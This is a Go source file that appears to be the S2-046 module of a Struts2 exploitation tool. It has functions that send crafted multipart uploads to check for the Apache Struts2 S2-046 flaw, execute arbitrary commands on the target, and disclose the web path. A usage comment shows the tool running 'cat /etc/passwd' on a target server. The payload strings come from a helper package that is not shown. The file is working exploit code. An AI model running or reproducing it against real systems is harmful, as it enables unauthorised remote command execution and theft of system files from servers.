package s046

import (
	"ST2G/cvemod/utils"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-046/doUpload.action --vn 46 --mode exec --cmd "cat /etc/passwd"
*/

func Check(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.PocS046Check)
	if err != nil {
		log.Println(err)
	}
	_ = writer.WriteField("", "")
	err = writer.Close()
	if err != nil {
		log.Println(err)
	}
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println(err)
		}
	}(response.Body)
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	if strings.Contains(respBody, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(url), utils.Red("*Found Struts2-046！"))
	} else {
		log.Printf("%s Struts2-046 Not Vulnerable.", utils.Green(url))
	}
}

func ExecCommand(url string, command string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.PocS046Exec(command))
	if err != nil {
	}
	_ = writer.WriteField("", "")
	err = writer.Close()
	if err != nil {
		log.Println(err)
	}
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println(err)
		}
	}(response.Body)
	content, _ := ioutil.ReadAll(response.Body)
	fmt.Println(string(content))
}

func GetWebPath(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.PocS046WebPath)
	if err != nil {
	}
	_ = writer.WriteField("", "")
	err = writer.Close()
	if err != nil {
		log.Println(err)
	}
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println(err)
		}
	}(response.Body)
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println(respBody)
}
